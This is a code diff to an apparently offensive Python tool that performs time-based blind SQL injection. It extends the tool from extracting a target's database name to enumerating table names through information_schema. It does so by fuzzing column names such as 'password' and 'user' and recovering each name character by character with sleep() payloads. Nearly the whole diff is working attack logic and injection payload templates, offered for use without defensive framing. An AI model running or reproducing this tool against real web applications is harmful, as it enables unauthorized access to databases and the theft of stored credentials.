@@ -20,6 +20,8 @@ SLEEP_TIME = 2
 
 ALPHABET = string.ascii_letters + string.digits + " !\"#$&'()*+,-./:;<=>?@[\\]^_`{|}~%"
 
+TABLES_FUZZING = ['password','pass','test','user','a','b']
+
 verif_payload = "select sleep(2)"
 verif_payload_urlencode ="select%20sleep%282%29"
 
@@ -117,25 +119,35 @@ def attack_one_payload(url, params, payload, verbose=0):
             print_redb('[-] Non effective payload')
         return False
 
-def attack_get_length(url, params):
-    for i in range(1, 20):
+def attack_get_length(url, params, database=True, fuzz="pass"):
+    if database:
+        query_template = "select sleep(2) from dual where database() like '{mask}'"
+    else:
+        query_template = "select sleep(2) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%{fuzz}%' limit 0,1) like '{mask}'"
+    for i in range(1, 40):
         mask = '_' * i
-        query = f"select sleep(10) from dual where database() like '{mask}'"
+        query = query_template.format(fuzz=fuzz,mask=mask)
         if attack_one_payload(url,params, query):
             return i
     print_redb('[-] Error: Length >20 caracters')
     return -1
 
-def attack_get_databasename(url, params, length, database_name=""):
+def attack_get_information(url, params, length, database_name="", database=True, fuzz="pass"):
+    if database:
+        query_template = "select sleep(2) from dual where database() like '{mask}'"
+        d="database"
+    else:
+        query_template = "select sleep(2) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%{fuzz}%' limit 0,1) like '{mask}'"
+        d="table"
     for char in ALPHABET:
         mask = database_name + char + '_' * (length - 1)
-        query = f"select sleep(10) from dual where database() like '{mask}'"
+        query = query_template.format(fuzz=fuzz,mask=mask)
         if attack_one_payload(url, params, query):
             if length == 1:
                 return char
             else:
-                print_greenb("[+] Retrieve database name : Length " + str(length) + ", Step retrieve :" + mask)
-                return char + attack_get_databasename(url, params, length - 1, database_name+char)
+                print_greenb("[+] Retrieve "+ d + " name : Length " + str(length) + ", Step retrieve :" + mask)
+                return char + attack_get_information(url, params, length - 1, database_name+char, database, fuzz=fuzz)
     print_redb('[-] Erreur: Caracter not in alphabet')
     return " "
 
@@ -148,9 +160,19 @@ def attack_main(url, params):
     else:
         return -1
     print_blue("[X] Retrieve database name")
-    database_name = attack_get_databasename(url, params, database_length)
+    database_name = attack_get_information(url, params, database_length)
     print_greenb("[+] Database name : " + database_name)
-    print_blue("[X] Retrieve password")
+    for table in TABLES_FUZZING:
+        print_blue("[X] Retrieve tables names")
+        print_blue("[X] Retrieve table name length (" + table + ")")
+        pass_length = attack_get_length(url, params, False, table)
+        if pass_length != -1:
+            print_greenb("[+] Table name length : " + str(pass_length))
+        else:
+            return -1
+        print_blue("[X] Retrieve table name")
+        password = attack_get_information(url, params, pass_length, "",False, table)
+        print_greenb("[+] Table : " + password)
 
 print(ascii_art)
 
